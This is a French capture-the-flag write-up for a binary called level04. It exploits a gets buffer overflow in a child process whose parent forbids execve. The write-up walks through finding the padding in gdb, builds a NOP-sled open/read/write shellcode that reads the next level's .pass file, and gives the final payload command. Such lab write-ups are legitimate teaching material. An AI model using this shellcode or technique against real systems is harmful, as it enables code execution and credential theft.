Lorsque nous analysons le code, nous constatons que nous lancons un processus enfant. Grace au buffer (et gets) nous pourrions changer la valeur de retour EIP par un shellcode, c'est d'ailleurs ce qui est suggere par la phrase: "Give me some shellcode".

Le processus parent surveille cependant a ce que syscall_num != 11, 11 correspondant a SYS_EXECVE. Nous ne pouvons donc pas envoyer un shellcode execve, nous allons donc essayer de lire directement le fichier et print son resultat dans notre terminal.

--> Le but va donc etre de donner dans le buffer le format suivant: [padding][adresse shellcode]

# Etape 1: Trouver le padding

```shell
gdb ./level04
set follow-fork-mode child
run <<< $(python -c "print 'A'*128 + 'qwertyuiopasdfghjklzxcvbnm0123456789'")
#On segfault: 0x35343332 in ?? ()
print/c 0x35343332
#$2 = 50 '2'
```

--> 2 est le 29eme char (+128 A), le padding est donc de 156.

# Etape 2: Le shellcode read/open/write

```shell
export SHELLCODE=$(python -c "print '\x90'*1000 + '\x31\xc9\x51\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc0\xb0\x08\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb2\x64\x31\xc0\xb0\x03\xcd\x80\x31\xdb\x43\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80'")
```

NB: Le path du file que nous voulons lire est /home/users/level05/.pass, cependant nous allons renseigner ////home/users/level05/.pass car sinon, linux ne pourrait pas convertir notre path en octet (car 25 n'est pas divisible par 4). Linux ignore les multiples /, donc nous pouvons en rajouter afin que ce soit divisible par 4.

On va egalement avoir besoin de l'adresse de SHELLCODE:

```shell
gdb ./level04
break main
# Breakpoint 1, 0x080486cd in main ()
run
print (char *)getenv("SHELLCODE")
# On obtient $1 = 0xffffd4c1
```

--> L'adresse de base est `0xffffd4c1`. 
L'environnement dans GDB étant légèrement différent de celui du bash pur, nous n'allons pas viser le tout début de l'adresse. Nous ajoutons 100 octets (`0x60`) pour viser le milieu de notre NOP sled.
`0xffffd4c1 + 0x60` = **`0xFFFFD521`**
En Little Endian, notre adresse finale est : `\x21\xd5\xff\xff`


# Execution

Maintenant que nous avons toutes nos informations, nous allons executer notre shellcode grace a un overflow du buffer:

```shell
python -c "print 'A'*156 + '\x21\xd5\xff\xff'" | ./level04
```

